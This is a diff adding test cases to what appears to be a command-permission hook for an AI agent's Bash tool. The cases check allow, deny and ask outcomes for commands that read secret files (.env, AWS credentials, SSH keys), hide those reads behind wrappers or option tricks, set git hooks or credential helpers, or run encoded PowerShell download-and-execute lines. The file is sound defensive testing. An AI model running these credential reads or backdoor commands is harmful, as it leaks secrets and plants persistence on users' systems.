@@ -1312,5 +1312,70 @@ testBash('deny: powershell -w hidden -enc still denies on Bash tool',
   join('powershell -nop -w hidden -en', 'c ZQBjAGgAbwA='), 'deny');
 testBash('deny: real PS iex( still denies', join('iex(iwr ', 'http://x)'), 'deny');
 
+console.log('\n--- v0.7.1: read-vs-write + program-argument false positives ---');
+// Reading a backdoor key is how you AUDIT for one; only the write form is a backdoor.
+testBash('v0.7.1 pass: git config read hooksPath', 'git config core.hooksPath; ls .githooks/', 'fallthrough');
+testBash('v0.7.1 pass: git config --get credential.helper', join('git config --get credential.hel', 'per'), 'fallthrough');
+testBash('v0.7.1 deny: git config write hooksPath', 'git config core.hooksPath /tmp/evil', 'deny');
+testBash('v0.7.1 deny: git config write credential.helper', join('git config --global credential.hel', 'per store'), 'deny');
+// A jq/rg/sed program argument is not a path.
+testBash('v0.7.1 pass: jq filter selecting .key', join("jq -r '.issues[] | .k", "ey' out.json"), 'allow');
+testBash('v0.7.1 pass: jq filter from a $VAR path', join("F=/t/out.txt; jq -r '.nodes[].k", "ey' $F"), 'allow');
+testBash('v0.7.1 pass: rg for a pem pattern', join("rg '\\.p", "em' src/"), 'allow');
+testBash('v0.7.1 pass: piped grep pattern', join("cat notes.md | grep '\\.en", "v'"), 'allow');
+// ...but the file argument after it still is.
+testBash('v0.7.1 deny: jq filter then secret file', join("jq -r '.a' ~/.aws/creden", 'tials'), 'deny');
+testBash('v0.7.1 deny: grep pattern then secret file', join("grep foo .en", 'v'), 'deny');
+testBash('v0.7.1 deny: grep -e pattern then secret file', join("grep -e foo .en", 'v'), 'deny');
+// -e supplies the pattern inline: its value is a pattern, not a path.
+testBash('v0.7.1 pass: grep -e pem pattern', join("grep -e '\\.p", "em' src/"), 'allow');
+testBash('v0.7.1 pass: sed -e env expression', join("sed -e 's/.en", "v/x/' notes.md"), 'allow');
+testBash('v0.7.1 pass: jq -e is exit-status, not a pattern flag', join("jq -e '.credentials.k", "ey' out.json"), 'allow');
+// -f names a FILE holding the pattern -- that value is still a path.
+testBash('v0.7.1 deny: grep -f secret file as pattern source', join('grep -f ~/.aws/creden', 'tials src/'), 'deny');
+// `--` ends option parsing: the token after it is a literal pattern, the file is real.
+testBash('v0.7.1 deny: grep -- -e hides the file', join('grep -- -e .en', 'v'), 'deny');
+testBash('v0.7.1 deny: grep -v -- -e hides the file', join('grep -v -- -e .en', 'v'), 'deny');
+testBash('v0.7.1 deny: rg -- -e hides the key', join('rg -- -e id_r', 'sa'), 'deny');
+testBash('v0.7.1 deny: sed -- --expression hides the file', join('sed -- --expression .en', 'v'), 'deny');
+// A context/count flag takes a number, not the pattern slot.
+testBash('v0.7.1 pass: grep -A 2 env pattern in a log', join('grep -A 2 .en', 'v app.log'), 'allow');
+testBash('v0.7.1 pass: grep -A2 attached form', join('grep -A2 .en', 'v app.log'), 'allow');
+testBash('v0.7.1 deny: grep -A 2 pattern then secret file', join('grep -A 2 foo .en', 'v'), 'deny');
+// getopt attached short-option value (`-fVALUE`) -- the file is the next token, not the pattern.
+testBash('v0.7.1 deny: grep -f attached pattern file', join('grep -fdummy.txt .en', 'v'), 'deny');
+testBash('v0.7.1 deny: grep -e attached pattern', join('grep -epat .en', 'v'), 'deny');
+testBash('v0.7.1 deny: sed -e attached expression', join('sed -es/a/b/ .en', 'v'), 'deny');
+testBash('v0.7.1 deny: sed bundled -nes attached', join('sed -nes/a/b/p .en', 'v'), 'deny');
+testBash('v0.7.1 deny: jq -f attached program file', join('jq -f/tmp/p.jq .en', 'v'), 'deny');
+testBash('v0.7.1 deny: rg -f attached pattern file', join('rg -fdummy.txt .en', 'v'), 'deny');
+// A read verb behind a command wrapper is still a read.
+testBash('v0.7.1 deny: env wrapper grep secret', join('env grep x .en', 'v'), 'deny');
+testBash('v0.7.1 deny: env VAR=1 wrapper grep secret', join('env FOO=1 grep x .en', 'v'), 'deny');
+testBash('v0.7.1 deny: time wrapper grep secret', join('time grep x .en', 'v'), 'deny');
+testBash('v0.7.1 deny: nohup wrapper grep secret', join('nohup grep x .en', 'v'), 'deny');
+testBash('v0.7.1 pass: env wrapper grep normal file', 'env FOO=1 grep x app.log', 'fallthrough');
+// Wrapper flags that take a separate value must not be mistaken for the command word.
+testBash('v0.7.1 deny: env -u VAR grep secret', join('env -u PATH grep foo .en', 'v'), 'deny');
+testBash('v0.7.1 deny: sudo -u user grep secret', join('sudo -u root grep foo .en', 'v'), 'deny');
+testBash('v0.7.1 deny: doas -u user grep secret', join('doas -u root grep foo .en', 'v'), 'deny');
+testBash('v0.7.1 deny: nice -n grep secret', join('nice -n 5 grep foo .en', 'v'), 'deny');
+testBash('v0.7.1 deny: unknown wrapper flag still finds the read verb', join('sudo --frob root grep foo .en', 'v'), 'deny');
+testBash('v0.7.1 ask: doas has an elevated-privilege floor', 'doas ls /root', 'ask');
+// A boolean wrapper flag must not swallow the command word (real `ionice -t`/`sudo -h`).
+testBash('v0.7.1 deny: ionice -t is boolean, grep still seen', join('ionice -t grep sed .en', 'v'), 'deny');
+testBash('v0.7.1 deny: sudo -h is boolean, grep still seen', join('sudo -h grep sed .en', 'v'), 'deny');
+testBash('v0.7.1 deny: mis-modeled value flag cannot eat a read verb', join('sudo -u grep sed .en', 'v'), 'deny');
+// A LONE positional is the program/pattern and the input is stdin -- no file is read.
+testBash('v0.7.1 pass: sed with only a script arg', join('sed .en', 'v'), 'allow');
+testBash('v0.7.1 pass: grep with only a pattern arg', join('grep ~/.ssh/id_r', 'sa'), 'allow');
+testBash('v0.7.1 deny: two positionals means the second is a file', join('sed 1p .en', 'v'), 'deny');
+// `env` alone dumps the environment; `env <cmd>` runs a command and must not be auto-approved.
+testBash('v0.7.1 pass: bare env', 'env', 'allow');
+testBash('v0.7.1 fallthrough: env running a command is not auto-approved', 'env -u PATH ./setup.sh', 'fallthrough');
+// ...and jq -e/-r bundles are still not pattern flags.
+testBash('v0.7.1 pass: jq -er filter selecting .key', join("jq -er '.credentials.k", "ey' out.json"), 'allow');
+testBash('v0.7.1 deny: secret read in a later pipe stage', join('ls | cat .en', 'v'), 'deny');
+
 console.log('\n=== Results: ' + passed + ' passed, ' + failed + ' failed ===');
 process.exit(failed > 0 ? 1 : 0);
